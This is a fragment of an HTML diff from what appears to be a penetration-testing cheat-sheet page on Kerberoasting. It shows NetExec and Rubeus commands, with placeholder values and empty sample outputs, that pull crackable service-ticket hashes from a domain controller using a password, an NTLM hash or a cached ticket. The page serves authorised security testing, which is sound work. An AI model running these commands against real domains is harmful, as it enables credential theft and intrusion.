+TO-DO</div></pre></div><div class="highlight ntlm codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM
+</span></span><span class="line"><span class="cl"><span class="go">sudo ntpdate -s <span class="o editable-keyword">&lt;DC_IP&gt;</span> &amp;&amp; nxc ldap <span class="o editable-keyword">&lt;DC_IP&gt;</span> -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -H '<span class="o editable-keyword">&lt;HASH&gt;</span>' -d <span class="o editable-keyword">&lt;DOMAIN&gt;</span> --kerberoasting kerberoast_hashes.txt
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><div class="highlight password-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password-based Kerberos
+</span></span><span class="line"><span class="cl"><span class="go">sudo ntpdate -s <span class="o editable-keyword">&lt;DC_IP&gt;</span> &amp;&amp; nxc ldap <span class="o editable-keyword">&lt;DC_IP&gt;</span> -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -d <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -k --kdcHost <span class="o editable-keyword">&lt;DC&gt;</span> --kerberoasting kerberoast_hashes.txt
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><div class="highlight ntlm-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM-based Kerberos
+</span></span><span class="line"><span class="cl"><span class="go">sudo ntpdate -s <span class="o editable-keyword">&lt;DC_IP&gt;</span> &amp;&amp; nxc ldap <span class="o editable-keyword">&lt;DC_IP&gt;</span> -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -H '<span class="o editable-keyword">&lt;HASH&gt;</span>' -d <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -k --kdcHost <span class="o editable-keyword">&lt;DC&gt;</span> --kerberoasting kerberoast_hashes.txt
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><div class="highlight ticket-based-kerberos codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Ticket-based Kerberos
+</span></span><span class="line"><span class="cl"><span class="go">sudo ntpdate -s <span class="o editable-keyword">&lt;DC_IP&gt;</span> &amp;&amp; nxc ldap <span class="o editable-keyword">&lt;DC_IP&gt;</span> -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -d <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -k --use-kcache --kdcHost <span class="o editable-keyword">&lt;DC&gt;</span> --kerberoasting kerberoast_hashes.txt
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div></div></div>
+
+</div><div class="tabcontent" data-tabset="set3" data-tabcontent="tab2"><div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\rubeus.exe kerberoast /creduser:<span class="o editable-keyword">&lt;DOMAIN&gt;</span>\<span class="o editable-keyword">&lt;USER&gt;</span> /credpassword:'<span class="o editable-keyword">&lt;PASSWORD&gt;</span>'
 </span></span></span></code><div class="output-bubble">Sample Output:
 TO-DO</div></pre></div></div></div>
 
 <p></p>
-<h3 id="kerberoasting-from-windows">Kerberoasting (From Windows)</h3>
-<p class="tabs">
-<button data-tabset="set3" data-tabcontent="tab1" class="active">rubeus</button>
-
-</p><div class="tabset-wrapper" data-tabset-group="set3"><div class="tabcontent active" data-tabset="set3" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\rubeus.exe kerberoast /creduser:<span class="o editable-keyword">&lt;DOMAIN&gt;</span>\<span class="o editable-keyword">&lt;USER&gt;</span> /credpassword:'<span class="o editable-keyword">&lt;PASSWORD&gt;</span>'
-</span></span></span></code><div class="output-bubble">Sample Output:
-TO-DO</div></pre></div></div></div><p></p>
-
+<br>
 </div>
 </main>
 <script type="module" src="/js/main.js"></script>
